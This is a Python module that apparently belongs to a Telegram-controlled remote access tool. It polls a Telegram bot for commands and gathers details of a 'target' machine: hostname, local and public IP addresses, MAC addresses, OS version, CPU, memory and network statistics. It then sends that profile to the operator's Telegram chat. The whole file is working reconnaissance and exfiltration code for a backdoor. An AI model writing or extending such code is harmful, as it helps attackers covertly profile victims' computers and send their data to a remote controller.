from .Engine import engine

import platform
import socket
from datetime import datetime
import time
from requests import get
import psutil


def get_last_message(bot_token):
    """
    get last message bot recived

    params : bot_token : telegram bot token

    retrun : last message bot recived
    """

    while True:
        try:
            time.sleep(3)
            response = engine.receive_message(bot_token)
            if response != False:
                message_id = response[-1]['message']['message_id']
                message_text = response[-1]['message']['text']

                result = {"text": message_text, "id": message_id}

                return result
        except:
            continue


def get_size(bytes, suffix="B"):
    """
    Scale bytes to its proper format
    e.g:
        1253656 => '1.20MB'
        1253656678 => '1.17GB'
    """

    factor = 1024
    for unit in ["", "K", "M", "G", "T", "P"]:
        if bytes < factor:
            return f"{bytes:.2f}{unit}{suffix}"
        bytes /= factor


# get public address
def get_ip():
    """
    get target ip

    retrun : target ip
    
    """
    try:
        ip = get("https://api.ipify.org").text
    except Exception:
        return "cannot get ip"
    else:
        return (f'{ip}')


def get_info(bot_token, chat_id):
    # for get Cpu information
    cpufreq = psutil.cpu_freq()

    # for get Memory information
    svmem = psutil.virtual_memory()

    # for get Swap inforamtion
    swap = psutil.swap_memory()

    # for get boot time target machin
    boot_time_timestamp = psutil.boot_time()
    bt = datetime.fromtimestamp(boot_time_timestamp)

    # for get network information
    if_addrs = psutil.net_if_addrs()

    # get IO statistics since boot
    net_io = psutil.net_io_counters()

    try:
        # information result
        info = "-------- Boot Time -----------"
        info += f"\n Boot Time: {bt.year}/{bt.month}/{bt.day} {bt.hour}:{bt.minute}:{bt.second}"

        info += "\n -------- system info -----------"
        info += f"\n platform: {platform.system()}"
        info += f"\n platform-release: {platform.release()}"
        info += f"\n platform-version: {platform.version()}".replace("#", '')
        info += f"\n architecture: {platform.machine()}"
        info += f"\n hostname: {socket.gethostname()}"
        info += f"\n ip-address: {socket.gethostbyname(socket.gethostname())}"
        info += f"\n public IP address: {get_ip()}"
        info += "\n -------- CPU info -----------"
        info += f"\n processor: {platform.processor()}"
        info += "\n Physical cores: " + str(psutil.cpu_count(logical=False))
        info += "\n Total cores: " + str(psutil.cpu_count(logical=True))
        info += f"\n Max Frequency: {cpufreq.max:.2f}Mhz"
        info += f"\n Min Frequency: {cpufreq.min:.2f}Mhz"
        info += f"\n Current Frequency: {cpufreq.current:.2f}Mhz"
        info += f"\n Total CPU Usage: {psutil.cpu_percent()}%"

        info += "\n -------- Memory info -----------"
        info += f"\n Total: {get_size(svmem.total)}"
        info += f"\n Available: {get_size(svmem.available)}"
        info += f"\n Used: {get_size(svmem.used)}"
        info += f"\n Percentage: {svmem.percent}%"

        info += "\n -------- SWAP info -----------"
        info += f"\n Total: {get_size(swap.total)}"
        info += f"\n Free: {get_size(swap.free)}"
        info += f"Used: {get_size(swap.used)}"
        info += f"Percentage: {swap.percent}%"

        info += "\n -------- Network info -----------"

        for interface_name, interface_addresses in if_addrs.items():

            for address in interface_addresses:

                info += f"\n=== Interface: {interface_name} ==="

                if str(address.family) == 'AddressFamily.AF_INET':
                    info += f"\n\tIP Address: {address.address}"
                    info += f"\n\tNetmask: {address.netmask}"
                    info += f"\n\tBroadcast IP: {address.broadcast}"

                elif str(address.family) == 'AddressFamily.AF_PACKET':
                    info += f"\n\tMAC Address: {address.address}"
                    info += f"\n\tNetmask: {address.netmask}"
                    info += f"\n\tBroadcast MAC: {address.broadcast}"

        info += f"Total Bytes Sent: {get_size(net_io.bytes_sent)}"
        info += f"Total Bytes Received: {get_size(net_io.bytes_recv)}"

    except Exception as ex:
        info = f"You Get Error:\n {ex}"

    engine.sender_message(text=info, bot_token=bot_token, chat_id=chat_id)
